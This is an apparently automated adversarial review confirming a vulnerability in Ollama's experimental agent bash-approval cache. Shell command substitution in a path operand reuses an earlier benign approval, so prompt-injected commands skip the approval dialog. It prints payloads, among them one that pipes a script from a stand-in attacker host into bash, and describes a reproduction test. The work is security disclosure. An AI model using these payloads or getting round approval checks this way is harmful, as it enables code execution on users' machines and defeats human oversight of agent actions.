# Cold Adversarial Review — p8-066 agent-approval-command-substitution-path

## Step 1 — Restated Claim and Sub-Claims

Restated: Ollama's experimental agent approval system caches per-command approvals using a path-prefix derived from a bash command string. The derivation uses `path.Clean` on the first path-like token, which is a purely lexical string operation. A shell command-substitution token such as `$(...)` or `` `...` `` embedded inside the path operand survives `path.Clean` intact. The resulting cache key is identical to a previously approved benign key (e.g. `cat:tools/`). When the tool_call reaches `IsAllowed`, it hits the cache, skips the approval dialog, and runs through `bash -c`, which evaluates the substitution before `cat` opens any file.

Sub-claims:
- **A**: An attacker can cause a `command` string containing `$(...)` inside the first path arg to reach the approval layer. (Via LLM tool_call under prompt injection.)
- **B**: The command traverses `IsDenied` without being blocked, and `extractBashPrefix` returns a key identical to the key produced for a previously-approved benign command.
- **C**: `bash -c` then executes the substitution as shell code, yielding arbitrary command execution as the ollama user.

All three sub-claims are coherent and testable.

## Step 2 — Independent Code Path Trace

Entry: `x/cmd/run.go:369-436` — the tool-call loop.

1. `args["command"].(string)` unwrapped (line 376).
2. `agent.IsDenied(cmd)` (line 378). Implementation at `x/agent/approval.go:175-193` does `strings.Contains(commandLower, pattern)` against 29 literal patterns. None of the patterns contain `$(`, backtick, `<(`, `>(`, `$((`, or any shell substitution delimiter. A payload `cat tools/$(curl -s http://x/shell.sh | bash)` does not contain `curl -d`, `curl --data`, `curl -X POST`, `curl -X PUT`, `rm -rf`, `rm -fr`, `sudo `, etc. — gate passes.
3. `approval.IsAllowed(toolName, args)` (line 404). Implementation at `x/agent/approval.go:389-423`:
   - Exact `bash:<full cmd>` lookup fails.
   - Calls `extractBashPrefix(cmd)` at line 402.
   - `extractBashPrefix` (lines 204-299): splits on `|`, takes first part, `strings.Fields`, picks first non-flag arg with `/`, runs `path.Clean`, takes `path.Dir`, returns `"<cmd>:<dir>/"`.
4. For `cat tools/$(curl ...` the first pipe-separated segment ends at the first `|`, but since `strings.Fields` then splits on whitespace, the chosen first arg is `tools/$(curl` — `path.Clean` leaves it literal — `path.Dir` → `tools` — prefix → `cat:tools/`.
5. `matchesHierarchicalPrefix` (line 427) compares against stored prefixes; `cat:tools/` stored from prior `cat tools/readme.md` approval matches exactly. Returns true.
6. Flow falls through to `toolRegistry.Execute(call)` at line 436.
7. `x/tools/bash.go:64` runs `exec.CommandContext(ctx, "bash", "-c", command)`. Bash expands the `$(...)` before `cat` executes.

No validation/sanitization function exists between `IsDenied` and `exec.Command`. No framework ORM, templating, or CSRF check applies — this is a shell pipeline.

## Step 3 — Protection Surface Search

| Layer | Protection Found | Blocks this attack? |
|---|---|---|
| Language (Go) | `path.Clean` is lexical, not aware of shell syntax | No — this is the vulnerable primitive |
| Framework | None applicable (CLI tool, not HTTP) | N/A |
| Middleware | None (direct exec) | N/A |
| Application: denylist | `IsDenied` uses 29 substring patterns | **No** — none match `$(`, `` ` ``, or the actual payload |
| Application: prefix-cache | `extractBashPrefix` + `matchesHierarchicalPrefix` | **No** — this is the vulnerable primitive |
| Application: outside-cwd warning | `isCommandOutsideCwd` sets `isWarning` flag | No — only affects the approval dialog UI, and the dialog is never shown when `IsAllowed` returns true |
| Application: UI | Full command text rendered on approval | **No** — dialog only shows on first approval; subsequent prefix-cache hits skip the dialog entirely |
| Docs/SECURITY.md | No SECURITY.md found; only "experimental" banner | Does not explicitly accept this risk |

No protection blocks the attack path.

## Step 4 — Real-Environment Reproduction

Environment: the ollama source tree at the workspace commit, used directly as a Go module. The `x/agent` package is a library — no server deploy needed.

Healthcheck: baseline `go test ./x/agent/` compiles and runs existing tests fine.

Reproduction test `TestCommandSubstitutionBypass_FullFlow` inserted at `/Users/bytedance/Desktop/demo/ollama/x/agent/repro_subst_test.go`:

1. Create `NewApprovalManager`.
2. Approve `cat tools/readme.md` via `AddToAllowlist`.
3. Construct payload `cat tools/$(touch /tmp/ollama_substitution_rce_test_marker && echo hijack)`.
4. Call `IsDenied(payload)` — returns `false`.
5. Call `am.IsAllowed("bash", args)` — returns `true`.
6. Call `exec.Command("bash", "-c", payload).CombinedOutput()` — matches `x/tools/bash.go:64`.
7. `os.Stat(marker)` — file exists.

Result: PASS. Marker file created at `/tmp/ollama_substitution_rce_test_marker`. Full output captured at `/Users/bytedance/Desktop/demo/ollama/archon/real-env-evidence/agent-approval-command-substitution-path/full_flow_output.txt`.

Additional test `TestCommandSubstitutionBypass` confirmed five payload variants all return `IsAllowed=true` after the single benign approval:
- `cat tools/$(whoami)`
- `cat tools/$(id)`
- `` cat tools/`whoami` ``
- `cat tools/$(curl -s http://attacker.test/shell.sh | bash)`
- `cat tools/$(id > /tmp/ollama_evidence)`

Test artifact cleaned up after evidence collection.

## Step 5 — Prosecution Brief

`extractBashPrefix` at `x/agent/approval.go:204-299` is built around the assumption that its input is a well-formed `<cmd> <path> [|<more>]` string. That assumption is false: the input is attacker-controllable text that will be given verbatim to `bash -c`. `path.Clean` provides zero shell-syntax validation; `$` `(` `)` `` ` `` are legal filename characters and pass through unchanged. The derived prefix therefore aliases substitution payloads with benign paths, and `matchesHierarchicalPrefix` lets any descendant key re-use the parent's approval.

The `IsDenied` denylist does not list shell-substitution metacharacters. Verified by enumeration of `denyPatterns` (`x/agent/approval.go:95-122`) and by test execution — `IsDenied("cat tools/$(curl -s http://attacker.com/x.sh | bash)")` returned `(false, "")`.

`bash -c` performs command substitution as the first step of expansion, before the outer command (`cat`) is invoked. The live test created a marker file from inside a `$()` substitution that was embedded in what the approval layer classified as a mere filesystem path.

End-to-end exploitation: one prior benign approval of `cat tools/<anything>` permanently unlocks, for the remainder of the session, a bash-substitution-controlled RCE primitive whose payload the model can emit unchallenged via any future `cat tools/$(...)` tool_call.

## Step 6 — Defense Brief

The feature is "experimental" and gated behind an explicit flag. The user must first approve a `cat tools/*` command before the bypass becomes possible — if the user refuses the initial approval, the cache never populates. The attacker must also have a prompt-injection foothold in the model's input (a compromised system message, malicious `web_search` result, or poisoned context). Finally, all execution happens as the local user, not root; broader system-level damage requires additional privilege-escalation primitives not provided by this finding.

However, these factors reduce the blast radius rather than close the attack. The finding is about the approval layer's job — which is to guard bash execution against precisely this scenario. There is no protection layer between `IsAllowed` and `exec.Command`; the approval cache IS the last line of defense, and it is broken for this input class. The defense has no blocking protection to cite and must concede reproduction occurred.

## Step 7 — Severity Challenge

Starting at MEDIUM.

- Remote triggerability: YES — prompt injection via web content is a standard component of the agent threat model.
- Trust boundary crossing: YES — B11, LLM/model → host RCE.
- Preconditions: one prior innocuous approval for `cat tools/*` (very realistic; `cat` is explicitly in the `safeCommands` map and this flow is the intended happy-path).
- Auth/unauth: low-priv — runs as the local user (same as the ollama CLI).
- Internet-facing: NO by default — requires local CLI session.

Upgrade to HIGH: remote triggerability + meaningful trust boundary + no admin/root requirement + realistic precondition. CRITICAL blocked by "requires prior user action" (the initial benign approval).

Severity-Final: HIGH (equals original).

## Verdict

**CONFIRMED**. Prosecution brief survives: no protection found that blocks the attack. Real-environment reproduction executed, with a concrete marker-file side effect proving the substitution fires.

PoC-Status: executed.

Evidence: `/Users/bytedance/Desktop/demo/ollama/archon/real-env-evidence/agent-approval-command-substitution-path/` (test source, baseline output, full-flow output).
